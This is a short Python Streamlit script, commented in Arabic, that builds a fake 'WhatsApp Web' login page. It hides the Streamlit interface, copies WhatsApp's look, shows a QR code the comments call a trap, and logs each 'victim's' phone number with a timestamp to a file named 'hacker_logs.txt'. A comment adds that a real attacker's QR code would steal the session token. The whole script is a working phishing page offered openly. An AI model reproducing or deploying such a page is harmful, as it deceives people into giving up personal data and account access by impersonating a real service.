import streamlit as st
import datetime

# إخفاء شريط Streamlit العلوي والقائمة لجعل الصفحة تبدو احترافية
st.set_page_config(page_title="WhatsApp Web", page_icon="💬", layout="centered")
hide_style = """
    <style>
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    .stApp {background-color: #f0f2f5;}
    </style>
"""
st.markdown(hide_style, unsafe_allow_html=True)

# تصميم الواجهة لتشبه واتساب بالظبط
st.image("https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg", width=80)
st.title("WhatsApp Web")
st.write("استخدم هاتفك لمسح الكود ضوئياً واستخدام واتساب على الكمبيوتر.")

# إنشاء باركود "فخ" (يوجه لنفس الصفحة أو لصفحة تسجيل)
# ملاحظة: في التجربة الحقيقية الهاكر بيحط باركود بيسحب الـ Token
qr_code_url = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=LOGIN_REQUEST_ID_88231"
st.image(qr_code_url, width=250)

st.write("---")
phone = st.text_input("أو أدخل رقم الهاتف المرتبط بالحساب", key="p_input")

if st.button("ربط الجهاز"):
    if phone:
        # هنا الهاكر بيسجل إن فيه "ضحية" حاولت تدخل
        with open("hacker_logs.txt", "a", encoding="utf-8") as f:
            f.write(f"محاولة دخول جديدة من رقم: {phone} بتاريخ: {datetime.datetime.now()}\n")
        st.info("جاري الاتصال... يرجى الانتظار")